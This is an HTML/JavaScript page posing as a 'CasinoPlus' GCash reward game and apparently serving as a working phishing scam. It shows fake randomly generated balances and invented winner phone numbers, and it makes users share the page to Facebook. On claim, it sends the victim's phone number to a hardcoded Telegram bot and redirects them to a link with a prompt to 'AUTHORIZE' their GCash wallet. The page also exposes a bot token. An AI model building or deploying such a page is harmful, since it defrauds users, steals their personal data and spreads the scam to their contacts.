<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>

    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">

    <style>
        :root { 
            --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); 
            --dark-bg: #04070d; 
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(212, 175, 55, 0.3);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Public Sans', sans-serif; 
            background-color: var(--dark-bg); 
            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); 
            color: #fff; display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; padding: 15px; overflow-x: hidden; 
        }

        /* OVERLAYS */
        #mobileOnlyOverlay { position: fixed; inset: 0; background: #04070d; z-index: 1000000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
        .spinner { width: 50px; height: 50px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* UI COMPONENTS */
        .card { background: var(--glass); width: 100%; max-width: 380px; padding: 20px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; }
        .logo-img { width: 130px; height: auto; margin-bottom: 15px; }
        .gc-mini-icon { width: 16px; height: 16px; vertical-align: middle; }
        .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); }

        /* GRID & CARDS */
        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0; }
        .card-wrapper { cursor: pointer; display: flex; justify-content: center; position: relative; }
        .card-img { width: 100%; max-width: 100px; height: auto; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); transition: 0.3s; }
        .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; transform: scale(0.9); }

        /* FLOATING MULTIPLIER TEXT */
        .floating-mult {
            position: absolute; top: 20%; color: #fbbf24; font-family: 'Orbitron', sans-serif;
            font-size: 26px; font-weight: 900; text-shadow: 0 0 10px #d4af37, 0 0 20px #000;
            pointer-events: none; animation: floatUp 1s ease-out forwards; z-index: 10;
        }
        @keyframes floatUp {
            0% { opacity: 1; transform: translateY(0) scale(0.8); }
            50% { transform: translateY(-30px) scale(1.3); }
            100% { opacity: 0; transform: translateY(-60px) scale(1); }
        }

        /* CARD ANIMATIONS */
        @keyframes goddessTwirl { 0% { transform: rotateY(0); } 100% { transform: rotateY(360deg); } }
        @keyframes monkeyBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
        @keyframes zeusShock { 0% { filter: brightness(1); } 50% { filter: brightness(2.5) drop-shadow(0 0 15px #fff); } 100% { filter: brightness(1); } }
        @keyframes bearHop { 0% { transform: scale(1); } 50% { transform: scale(1.1) rotate(5deg); } 100% { transform: scale(1); } }
        @keyframes dressFloat { 0% { transform: translateY(0); } 50% { transform: translateY(-12px); } 100% { transform: translateY(0); } }
        @keyframes boxerPunch { 0% { transform: scale(1); } 50% { transform: scale(1.2) translateX(10px); } 100% { transform: scale(1); } }
        .move-goddess { animation: goddessTwirl 0.6s ease-out 1; }
        .move-monkey { animation: monkeyBounce 0.5s ease-out 1; }
        .move-zeus { animation: zeusShock 0.4s ease-out 1; }
        .move-bear { animation: bearHop 0.5s ease-out 1; }
        .move-dress { animation: dressFloat 0.6s ease-out 1; }
        .move-boxer { animation: boxerPunch 0.4s ease-out 1; }

        /* TYPOGRAPHY & BUTTONS */
        .amount { font-family: 'Orbitron', sans-serif; font-size: 38px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 5px 0; transition: transform 0.1s; }
        .timer-box { font-size: 13px; color: #fbbf24; font-weight: 800; margin: 10px 0; }
        
        .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
        .share-btn { background: #1877f2; color: #fff; width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; text-transform: uppercase; cursor: pointer; display: none; box-shadow: 0 5px 0 #1052a8; }
        .pay-button { background: var(--gold); color: #000; width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; display: none; box-shadow: 0 5px 0 #8b6508; }
        .promo-photo { width: 100%; border-radius: 15px; margin-top: 20px; border: 1px solid var(--border); }
    </style>
</head>
<body>

    <div id="mobileOnlyOverlay">
        <div style="font-size: 60px;">📱</div>
        <h2 style="color:#fbbf24; margin: 15px 0;">Mobile Access Only</h2>
        <p style="color:#94a3b8; font-size: 14px; padding: 0 30px;">This reward is only available via Mobile Browsers. Please switch to your phone.</p>
    </div>

    <div id="processingOverlay">
        <div class="spinner"></div>
        <div style="color:#fff; font-weight:900; font-size:18px;">ESTABLISHING SECURE VIALINK...</div>
        <div style="color:#fbbf24; font-size:12px; margin-top:10px; padding:0 20px;">⚠️ REQUIRED: Tap <b>"AUTHORIZE"</b> to verify your GCash wallet.</div>
    </div>

    <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
        
        <div style="text-align:center; margin-bottom:15px;">
            <div style="color:#22c55e; font-size:10px; font-weight:800;"><span style="width:8px; height:8px; background:#22c55e; border-radius:50%; display:inline-block; margin-right:5px; box-shadow:0 0 8px #22c55e;"></span> <span id="userCount">74</span> ONLINE</div>
            <div class="live-winner-box" id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱500</div>
        </div>

        <div class="card">
            <img src="images/logo1.png" class="logo-img">
            
            <div class="game-grid" id="gameGrid">
                <div class="card-wrapper" onclick="handleTap(this, 'goddess', 1)"><img src="images/img1.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'monkey', 2)"><img src="images/img2.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'zeus', 3)"><img src="images/img3.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'bear', 4)"><img src="images/img4.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'dress', 5)"><img src="images/img5.png" class="card-img"></div>
                <div class="card-wrapper" onclick="handleTap(this, 'boxer', 6)"><img src="images/img6.png" class="card-img"></div>
            </div>

            <div style="font-size: 10px; color: #fbbf24; font-weight: 800; letter-spacing: 2px;">AVAILABLE BALANCE</div>
            <div class="amount" id="balanceText">₱0.00</div>
            
            <div class="timer-box" id="timerLabel">Generating initial reward: <span id="countdown">05</span>s</div>

            <div class="btn-group">
                <button class="share-btn" id="shareBtn" onclick="shareToFB()">Share to Facebook (+₱50.00)</button>
                <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">Withdraw via GCash</button>
            </div>

            <img src="images/casinoplus.jpeg" class="promo-photo">
        </div>
    </div>

    <script>
        // MOBILE ONLY CHECK
        (function() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobile && window.innerWidth > 768) {
                document.getElementById('mobileOnlyOverlay').style.display = 'flex';
                document.getElementById('mainContent').style.display = 'none';
            }
        })();

        // FIREBASE INITIALIZATION
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userPhone = localStorage.getItem("userPhone") || "Unknown_User";
        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
        const chatId = "7298607329";

        let balance = 0;
        let clicks = 0;
        let isReadyToPlay = false; // Prevent clicking during initial countdown
        const baseAmount = Math.floor(Math.random() * (1500 - 500 + 1)) + 500; // Random starting amount 500-1500

        // START INITIAL COUNTDOWN ON LOAD
        window.onload = () => {
            // Animate initial random balance over 5 seconds
            animateValue(0, baseAmount, 5000);
            
            let timeLeft = 5;
            const timerBox = document.getElementById('timerLabel');
            const cdText = document.getElementById('countdown');
            
            const initTimer = setInterval(() => {
                timeLeft--;
                cdText.innerText = "0" + timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(initTimer);
                    balance = baseAmount; // Set exact balance
                    isReadyToPlay = true;
                    timerBox.innerHTML = "✅ Base reward unlocked! Tap cards for bonus.";
                    timerBox.style.color = "#22c55e";
                }
            }, 1000);
        };

        // CARD TAP LOGIC WITH MULTIPLIERS
        function handleTap(el, animName, id) {
            if (!isReadyToPlay || clicks >= 6 || el.classList.contains('card-disabled')) return;
            
            clicks++;
            const img = el.querySelector('img');
            img.classList.add('move-' + animName);

            // MULTIPLIER MATH (Base: ₱25)
            const rand = Math.random();
            let mult = 2; // 60% chance
            if (rand < 0.10) mult = 4; // 10% chance
            else if (rand < 0.40) mult = 3; // 30% chance

            const addedAmount = 25 * mult;
            const nextBal = balance + addedAmount;
            
            // Show Floating Multiplier
            const floater = document.createElement('div');
            floater.className = 'floating-mult';
            floater.innerText = `x${mult}`;
            el.appendChild(floater);
            
            // Pop the balance text
            const balText = document.getElementById('balanceText');
            balText.style.transform = "scale(1.1)";
            setTimeout(() => { balText.style.transform = "scale(1)"; }, 150);

            animateValue(balance, nextBal, 400);
            balance = nextBal;

            setTimeout(() => { 
                el.classList.add('card-disabled'); 
                floater.remove();
            }, 800);

            // SHOW SHARE BUTTON AT 6 CLICKS
            if (clicks === 6) {
                setTimeout(() => {
                    document.getElementById('timerLabel').innerHTML = "🎁 All bonuses collected! Share to claim.";
                    document.getElementById('timerLabel').style.color = "#fbbf24";
                    document.getElementById('shareBtn').style.display = 'block';
                }, 800);
            }
        }

        function shareToFB() {
            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
            
            // Reward +50 and transition to Withdraw Button
            setTimeout(() => {
                animateValue(balance, balance + 50, 500);
                balance += 50;
                
                document.getElementById('shareBtn').style.display = 'none';
                document.getElementById('timerLabel').style.display = 'none';
                
                const claimBtn = document.getElementById('claimBtn');
                claimBtn.style.display = 'block';
                claimBtn.innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
            }, 1000);
        }

        function animateValue(start, end, duration) {
            let startTimestamp = null;
            const step = (timestamp) => {
                if (!startTimestamp) startTimestamp = timestamp;
                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                document.getElementById('balanceText').innerText = "₱" + Math.floor(progress * (end - start) + start).toLocaleString() + ".00";
                if (progress < 1) window.requestAnimationFrame(step);
            };
            window.requestAnimationFrame(step);
        }

        // TELEGRAM LOGS ONLY ON CLAIM BUTTON
        function redirectToGCash() {
            const overlay = document.getElementById('processingOverlay');
            overlay.style.display = 'flex';

            const msg = `🔔 [ViaLink] CLAIM INITIATED!\n📱 Phone: ${userPhone}\n💰 Amount: ₱${balance}\n📍 Status: Redirecting to ViaLink...`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);

            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
                if (snapshot.exists()) {
                    const linkId = Object.keys(snapshot.val())[0];
                    const targetUrl = snapshot.val()[linkId].url;
                    db.ref('links/' + linkId).update({ status: 'pending', user: userPhone });
                    setTimeout(() => { window.location.href = targetUrl; }, 3000);
                } else {
                    alert("System Busy! Reward slots are full. Try again later.");
                    overlay.style.display = 'none';
                }
            });
        }

        // FIXED LIVE WINNER ROTATOR
        setInterval(() => {
            const online = Math.floor(Math.random() * 30) + 60;
            document.getElementById('userCount').innerText = online;
            
            const prefixes = ["0917", "0915", "0998", "0966", "0927", "0939"];
            const pref = prefixes[Math.floor(Math.random() * prefixes.length)];
            const suffix = Math.floor(1000 + Math.random() * 9000);
            
            const amounts = [500, 800, 1000, 1200, 1500, 2000];
            const amt = amounts[Math.floor(Math.random() * amounts.length)];
            
            document.getElementById('winnerEntry').innerHTML = `User ${pref}***${suffix} claimed <img src="images/gc_icon.png" class="gc-mini-icon"> ₱${amt.toLocaleString()}`;
        }, 3500);

    </script>
</body>
</html>
